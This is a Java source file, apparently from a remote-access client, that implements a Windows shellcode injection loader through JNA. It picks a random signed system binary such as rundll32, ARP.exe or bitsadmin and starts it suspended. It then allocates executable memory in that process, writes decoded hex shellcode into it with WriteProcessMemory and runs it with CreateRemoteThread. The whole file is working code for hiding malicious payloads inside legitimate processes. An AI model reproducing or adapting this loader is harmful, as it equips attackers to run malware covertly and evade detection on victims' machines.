package client.utils.system;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.io.File;
import java.util.Random;

public class ShellcodeUtil {
    public static String[] ProcessArrayx32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe", "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe", "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe", "C:\\Windows\\SysWOW64\\choice.exe", "C:\\Windows\\SysWOW64\\cmdkey.exe", "C:\\Windows\\SysWOW64\\comp.exe", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe", "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe", "C:\\Windows\\SysWOW64\\gpresult.exe"};
    public static String[] ProcessArrayx64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe", "C:\\Windows\\System32\\fc.exe", "C:\\Windows\\System32\\ARP.EXE", "C:\\Windows\\System32\\expand.exe"};
    static Kernel32 kernel32;
    static IKernel32 iKernel32;

    static {
        kernel32 = Native.loadLibrary(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
        iKernel32 = Native.loadLibrary("kernel32", IKernel32.class);
    }


    public static void LoadShellcode(String args) {
        ShellcodeUtil jnaLoader = new ShellcodeUtil();
        boolean is64 = false;
        jnaLoader.loadShellCode(args, is64);
    }

    public static void shuffleArray(String[] arr) {
        Random rand = new Random();
        for (int i = arr.length - 1; i > 0; i--) {
            int index = rand.nextInt(i + 1);
            String temp = arr[i];
            arr[i] = arr[index];
            arr[index] = temp;
        }
    }

    public static String[] mergeArrays(String[] a, String[] b) {
        String[] c = new String[a.length + b.length];
        int i = 0;
        for (String s : a) {
            c[i] = s;
            i++;
        }
        for (String s : b) {
            c[i] = s;
            i++;
        }
        return c;
    }

    public static byte[] hexStrToByteArray(String str) {
        if (str == null) {
            return null;
        } else if (str.isEmpty()) {
            return new byte[0];
        } else {
            byte[] byteArray = new byte[str.length() / 2];

            for (int i = 0; i < byteArray.length; ++i) {
                String subStr = str.substring(2 * i, 2 * i + 2);
                byteArray[i] = (byte) Integer.parseInt(subStr, 16);
            }

            return byteArray;
        }
    }

    public void loadShellCode(String shellcodeHex, boolean is64) {

        String[] targetProcessArray;
        //打乱数组顺序
        shuffleArray(ProcessArrayx64);
        shuffleArray(ProcessArrayx32);
        // java是64位且选择注入64位shellcode
        if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
            targetProcessArray = mergeArrays(ProcessArrayx64, ProcessArrayx32);
        } else { //默认注入32位进程
            targetProcessArray = mergeArrays(ProcessArrayx32, ProcessArrayx64);
        }
        String targetProcess = null;
        for (String string : targetProcessArray) {
            targetProcess = string;
            if (new File(targetProcess).exists()) {
                break;
            }
        }
        this.loadShellCode(shellcodeHex, targetProcess);

    }

    public void loadShellCode(String shellcodeHex, String targetProcess) {
        byte[] shellcode = hexStrToByteArray(shellcodeHex);
        int shellcodeSize = shellcode.length;
        IntByReference intByReference = new IntByReference(0);
        Memory memory = new Memory(shellcodeSize);

        for (int j = 0; j < shellcodeSize; ++j) {
            memory.setByte(j, shellcode[j]);
        }

        WinBase.PROCESS_INFORMATION pROCESS_INFORMATION = new WinBase.PROCESS_INFORMATION();
        WinBase.STARTUPINFO sTARTUPINFO = new WinBase.STARTUPINFO();
        sTARTUPINFO.cb = new WinDef.DWORD(pROCESS_INFORMATION.size());
        if (kernel32.CreateProcess(targetProcess, null, null, null, false, new WinDef.DWORD(4L), null, null, sTARTUPINFO, pROCESS_INFORMATION)) {
            Pointer pointer = iKernel32.VirtualAllocEx(pROCESS_INFORMATION.hProcess, Pointer.createConstant(0), shellcodeSize, 4096, 64);
            iKernel32.WriteProcessMemory(pROCESS_INFORMATION.hProcess, pointer, memory, shellcodeSize, intByReference);
            HANDLE hANDLE = iKernel32.CreateRemoteThread(pROCESS_INFORMATION.hProcess, null, 0, pointer, 0, 0, null);
            kernel32.WaitForSingleObject(hANDLE, -1);
        }
    }

    interface IKernel32 extends StdCallLibrary {

        Pointer VirtualAllocEx(HANDLE var1, Pointer var2, int var3, int var4, int var5);

        HANDLE CreateRemoteThread(HANDLE var1, Object var2, int var3, Pointer var4, int var5, int var6, Object var7);

        void WriteProcessMemory(HANDLE param1HANDLE, Pointer param1Pointer1, Pointer param1Pointer2, int param1Int, IntByReference param1IntByReference);

    }
}
